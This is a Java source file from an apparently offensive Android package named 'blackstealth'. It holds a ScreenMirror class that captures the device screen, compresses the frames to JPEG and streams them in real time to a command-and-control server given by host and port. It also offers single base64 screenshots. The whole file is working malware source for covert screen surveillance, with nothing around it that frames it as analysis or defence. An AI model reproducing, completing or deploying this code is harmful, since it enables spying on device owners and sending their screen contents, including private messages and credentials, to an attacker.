package com.offensive.blackstealth.remote;

import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;
import java.io.*;
import java.net.*;
import java.nio.ByteBuffer;
import java.util.concurrent.*;

/**
 * Screen Mirror
 * Real-time screen streaming to C2
 */
public class ScreenMirror {
    private static final String TAG = "ScreenMirror";
    
    private Context context;
    private MediaProjectionManager projectionManager;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    
    private HandlerThread handlerThread;
    private Handler handler;
    private ExecutorService executor;
    
    private Socket streamSocket;
    private DataOutputStream socketOut;
    
    private int screenWidth;
    private int screenHeight;
    private int screenDensity;
    private int quality = 50;  // JPEG quality
    private int frameRate = 10;  // FPS
    
    private volatile boolean isStreaming = false;
    private ScheduledExecutorService frameScheduler;
    
    public interface StreamCallback {
        void onStreamStarted();
        void onStreamStopped();
        void onFrameSent(int frameSize);
        void onError(String error);
    }
    
    private StreamCallback callback;
    
    public ScreenMirror(Context context) {
        this.context = context;
        this.projectionManager = (MediaProjectionManager) 
            context.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        this.executor = Executors.newSingleThreadExecutor();
        
        // Get screen metrics
        WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        wm.getDefaultDisplay().getMetrics(metrics);
        
        this.screenWidth = metrics.widthPixels;
        this.screenHeight = metrics.heightPixels;
        this.screenDensity = metrics.densityDpi;
    }
    
    public void setCallback(StreamCallback callback) {
        this.callback = callback;
    }
    
    public void setQuality(int quality) {
        this.quality = Math.max(10, Math.min(100, quality));
    }
    
    public void setFrameRate(int fps) {
        this.frameRate = Math.max(1, Math.min(30, fps));
    }
    
    public void setResolution(int width, int height) {
        this.screenWidth = width;
        this.screenHeight = height;
    }
    
    /**
     * Initialize with MediaProjection permission result
     */
    public void initialize(int resultCode, Intent data) {
        mediaProjection = projectionManager.getMediaProjection(resultCode, data);
        
        if (mediaProjection != null) {
            setupVirtualDisplay();
            Log.i(TAG, "Screen mirror initialized");
        } else {
            Log.e(TAG, "Failed to get MediaProjection");
            if (callback != null) callback.onError("MediaProjection initialization failed");
        }
    }
    
    /**
     * Setup virtual display for screen capture
     */
    private void setupVirtualDisplay() {
        handlerThread = new HandlerThread("ScreenMirror");
        handlerThread.start();
        handler = new Handler(handlerThread.getLooper());
        
        imageReader = ImageReader.newInstance(
            screenWidth, screenHeight,
            PixelFormat.RGBA_8888, 2);
        
        virtualDisplay = mediaProjection.createVirtualDisplay(
            "ScreenMirror",
            screenWidth, screenHeight, screenDensity,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader.getSurface(),
            null, handler);
    }
    
    /**
     * Start streaming to C2 server
     */
    public void startStreaming(String host, int port) {
        if (mediaProjection == null) {
            if (callback != null) callback.onError("Not initialized");
            return;
        }
        
        executor.submit(() -> {
            try {
                // Connect to streaming server
                streamSocket = new Socket();
                streamSocket.connect(new InetSocketAddress(host, port), 10000);
                streamSocket.setTcpNoDelay(true);
                socketOut = new DataOutputStream(new BufferedOutputStream(streamSocket.getOutputStream()));
                
                // Send header info
                socketOut.writeInt(screenWidth);
                socketOut.writeInt(screenHeight);
                socketOut.writeInt(frameRate);
                socketOut.flush();
                
                isStreaming = true;
                
                if (callback != null) callback.onStreamStarted();
                Log.i(TAG, "Streaming to " + host + ":" + port);
                
                // Start frame capture loop
                startFrameCapture();
                
            } catch (Exception e) {
                Log.e(TAG, "Stream connect failed: " + e.getMessage());
                if (callback != null) callback.onError(e.getMessage());
            }
        });
    }
    
    /**
     * Start frame capture at specified FPS
     */
    private void startFrameCapture() {
        frameScheduler = Executors.newSingleThreadScheduledExecutor();
        long intervalMs = 1000 / frameRate;
        
        frameScheduler.scheduleAtFixedRate(() -> {
            if (!isStreaming) return;
            
            try {
                Image image = imageReader.acquireLatestImage();
                if (image != null) {
                    byte[] jpegData = imageToJpeg(image);
                    image.close();
                    
                    if (jpegData != null) {
                        sendFrame(jpegData);
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Frame capture error: " + e.getMessage());
            }
        }, 0, intervalMs, TimeUnit.MILLISECONDS);
    }
    
    /**
     * Convert Image to JPEG bytes
     */
    private byte[] imageToJpeg(Image image) {
        try {
            Image.Plane[] planes = image.getPlanes();
            ByteBuffer buffer = planes[0].getBuffer();
            int pixelStride = planes[0].getPixelStride();
            int rowStride = planes[0].getRowStride();
            int rowPadding = rowStride - pixelStride * screenWidth;
            
            // Create bitmap from buffer
            Bitmap bitmap = Bitmap.createBitmap(
                screenWidth + rowPadding / pixelStride,
                screenHeight, Bitmap.Config.ARGB_8888);
            bitmap.copyPixelsFromBuffer(buffer);
            
            // Crop to actual size if needed
            if (bitmap.getWidth() != screenWidth) {
                Bitmap cropped = Bitmap.createBitmap(bitmap, 0, 0, screenWidth, screenHeight);
                bitmap.recycle();
                bitmap = cropped;
            }
            
            // Compress to JPEG
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, baos);
            bitmap.recycle();
            
            return baos.toByteArray();
            
        } catch (Exception e) {
            Log.e(TAG, "Image conversion error: " + e.getMessage());
            return null;
        }
    }
    
    /**
     * Send frame to C2
     */
    private synchronized void sendFrame(byte[] jpegData) {
        if (!isStreaming || socketOut == null) return;
        
        try {
            // Frame format: [length:4][data:length]
            socketOut.writeInt(jpegData.length);
            socketOut.write(jpegData);
            socketOut.flush();
            
            if (callback != null) callback.onFrameSent(jpegData.length);
            
        } catch (Exception e) {
            Log.e(TAG, "Send frame error: " + e.getMessage());
            stopStreaming();
        }
    }
    
    /**
     * Capture single screenshot
     */
    public byte[] captureScreenshot() {
        if (imageReader == null) return null;
        
        try {
            Image image = imageReader.acquireLatestImage();
            if (image != null) {
                byte[] jpeg = imageToJpeg(image);
                image.close();
                return jpeg;
            }
        } catch (Exception e) {
            Log.e(TAG, "Screenshot error: " + e.getMessage());
        }
        return null;
    }
    
    /**
     * Get screenshot as Base64
     */
    public String captureScreenshotBase64() {
        byte[] jpeg = captureScreenshot();
        if (jpeg != null) {
            return Base64.encodeToString(jpeg, Base64.NO_WRAP);
        }
        return null;
    }
    
    /**
     * Stop streaming
     */
    public void stopStreaming() {
        isStreaming = false;
        
        if (frameScheduler != null) {
            frameScheduler.shutdownNow();
            frameScheduler = null;
        }
        
        try { if (socketOut != null) socketOut.close(); } catch (Exception e) {}
        try { if (streamSocket != null) streamSocket.close(); } catch (Exception e) {}
        
        streamSocket = null;
        socketOut = null;
        
        if (callback != null) callback.onStreamStopped();
        Log.i(TAG, "Streaming stopped");
    }
    
    /**
     * Full cleanup
     */
    public void release() {
        stopStreaming();
        
        if (virtualDisplay != null) {
            virtualDisplay.release();
            virtualDisplay = null;
        }
        
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
        
        if (mediaProjection != null) {
            mediaProjection.stop();
            mediaProjection = null;
        }
        
        if (handlerThread != null) {
            handlerThread.quitSafely();
            handlerThread = null;
        }
        
        executor.shutdown();
        Log.i(TAG, "Screen mirror released");
    }
    
    public boolean isStreaming() {
        return isStreaming;
    }
    
    public boolean isInitialized() {
        return mediaProjection != null;
    }
}
